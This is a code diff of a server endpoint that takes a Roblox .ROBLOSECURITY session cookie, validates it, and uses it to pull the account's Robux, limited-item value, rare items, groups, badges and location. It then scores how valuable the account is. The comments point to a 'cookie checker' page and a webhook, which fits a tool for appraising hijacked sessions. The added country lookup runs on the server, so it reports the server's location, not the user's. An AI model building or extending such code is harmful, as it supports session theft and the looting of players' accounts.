@@ -38,6 +38,29 @@ async function validateCookie(cookie) {
     }
 }
 
+// Get user's country/location
+async function getUserCountry() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        return {
+            country: data.country_name || 'Unknown',
+            countryFlag: data.country_code ? getCountryFlag(data.country_code) : ''
+        };
+    } catch {
+        return { country: 'Unknown', countryFlag: '' };
+    }
+}
+
+// Convert country code to flag emoji
+function getCountryFlag(countryCode) {
+    const codePoints = countryCode
+        .toUpperCase()
+        .split('')
+        .map(char => 127397 + char.charCodeAt());
+    return String.fromCodePoint(...codePoints);
+}
+
 // Calculate account score
 function calculateAccountScore(userData) {
     let score = 0;
@@ -54,13 +77,10 @@ function calculateAccountScore(userData) {
     
     if (userData.isPremium) score += 10;
     
-    if (userData.vcStatus === '✅ Enabled') score += 5;
+    if (userData.hasHeadless) score += 15;
+    if (userData.hasKorblox) score += 10;
     
-    if (userData.headlessStatus === '✅ True') score += 15;
-    
-    if (userData.korbloxStatus === '✅ True') score += 10;
-    
-    const ageDays = parseInt(userData.accountAge);
+    const ageDays = userData.accountAgeDays;
     if (ageDays > 2000) score += 10;
     else if (ageDays > 1000) score += 7;
     else if (ageDays > 365) score += 5;
@@ -71,9 +91,9 @@ function calculateAccountScore(userData) {
     else if (totalSocial > 500) score += 3;
     else if (totalSocial > 100) score += 2;
     
-    if (userData.totalGroupsOwned > 10) score += 5;
-    else if (userData.totalGroupsOwned > 5) score += 3;
-    else if (userData.totalGroupsOwned > 0) score += 1;
+    if (userData.groupsOwned > 10) score += 5;
+    else if (userData.groupsOwned > 5) score += 3;
+    else if (userData.groupsOwned > 0) score += 1;
     
     return Math.min(score, 100);
 }
@@ -100,6 +120,9 @@ module.exports = async (req, res) => {
         const userId = userInfo.id;
         const username = userInfo.name;
         const displayName = userInfo.displayName;
+
+        // Get location
+        const location = await getUserCountry();
 
         // If checkOnly mode (for cookie checker page)
         if (checkOnly) {
@@ -193,9 +216,10 @@ module.exports = async (req, res) => {
             followersResponse,
             collectiblesResponse,
             groupsResponse,
-            userDetailsResponse
+            userDetailsResponse,
+            badgesResponse
         ] = await Promise.all([
-            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
+            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`),
             fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                 headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
             }),
@@ -204,7 +228,8 @@ module.exports = async (req, res) => {
             fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`),
             fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Desc`),
             fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`),
-            fetch(`https://users.roblox.com/v1/users/${userId}`)
+            fetch(`https://users.roblox.com/v1/users/${userId}`),
+            fetch(`https://badges.roblox.com/v1/users/${userId}/badges?limit=10&sortOrder=Desc`)
         ]);
 
         const avatarData = await avatarResponse.json();
@@ -215,6 +240,7 @@ module.exports = async (req, res) => {
         const collectiblesData = await collectiblesResponse.json();
         const groupsData = await groupsResponse.json();
         const userDetails = await userDetailsResponse.json();
+        const badgesData = await badgesResponse.json();
 
         const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
         const robux = robuxData.robux || 0;
@@ -223,10 +249,12 @@ module.exports = async (req, res) => {
         const followersCount = followersData.count || 0;
 
         let rap = 0;
+        let limitedCount = 0;
         if (collectiblesData.data) {
             collectiblesData.data.forEach(item => {
                 if (item.recentAveragePrice) {
                     rap += item.recentAveragePrice;
+                    limitedCount++;
                 }
             });
         }
@@ -240,7 +268,17 @@ module.exports = async (req, res) => {
         const now = new Date();
         const accountAgeDays = Math.floor((now - created) / (1000 * 60 * 60 * 24));
 
-        const userData = {
+        // Get badges info
+        let badgesInfo = '';
+        if (badgesData.data && badgesData.data.length > 0) {
+            badgesData.data.slice(0, 3).forEach(badge => {
+                badgesInfo += `• ${badge.name} → 🏆 ${badge.statistics?.winRatePercentage || 0}% | ❌\n`;
+            });
+        } else {
+            badgesInfo = '• No badges found';
+        }
+
+        const detailedInfo = {
             userId,
             username,
             displayName,
@@ -248,27 +286,30 @@ module.exports = async (req, res) => {
             robux,
             pendingRobux: 0,
             rap,
-            summary: `${robux} R$ | ${rap} RAP`,
-            pinStatus: '❌ Disabled',
+            accountAgeDays,
+            country: location.country,
+            countryFlag: location.countryFlag,
+            creditBalance: '0',
+            convertBalance: '0',
+            paymentsBalance: '0 🛡️',
+            groupBalance: '0',
+            groupPending: '0',
+            groupsOwned,
+            emailStatus: userDetails.hasVerifiedBadge ? 'Verified' : 'Unverified',
+            limitedPurchases: limitedCount,
+            purchaseSummary: '0',
+            badges: badgesInfo,
+            accountScore: 0,
             isPremium,
-            vcStatus: '❌ Disabled',
-            headlessStatus: hasHeadless ? '✅ True' : '❌ False',
-            korbloxStatus: hasKorblox ? '✅ True' : '❌ False',
-            accountAge: `${accountAgeDays} days`,
+            hasHeadless,
+            hasKorblox,
             friendsCount,
-            followersCount,
-            creditBalance: '0.00',
-            creditRobux: '0',
-            totalGroupsOwned: groupsOwned,
-            totalGroupFunds: 0,
-            totalPendingGroupFunds: 0,
-            emailVerified: userDetails.hasVerifiedBadge ? '✅ Verified' : '❌ Not Verified',
-            accountScore: 0
+            followersCount
         };
 
-        userData.accountScore = calculateAccountScore(userData);
+        detailedInfo.accountScore = calculateAccountScore(detailedInfo);
 
-        // Return success response to frontend (webhook is sent from browser now!)
+        // Return success response
         return res.status(200).json({
             success: true,
             userInfo: {
@@ -280,9 +321,10 @@ module.exports = async (req, res) => {
                 rap,
                 premium: isPremium ? '✅ True' : '❌ False',
                 voiceChat: '❌ Disabled',
-                accountScore: userData.accountScore
+                accountScore: detailedInfo.accountScore
             },
-            avatarUrl: userData.avatarUrl
+            avatarUrl,
+            detailedInfo
         });
 
     } catch (error) {
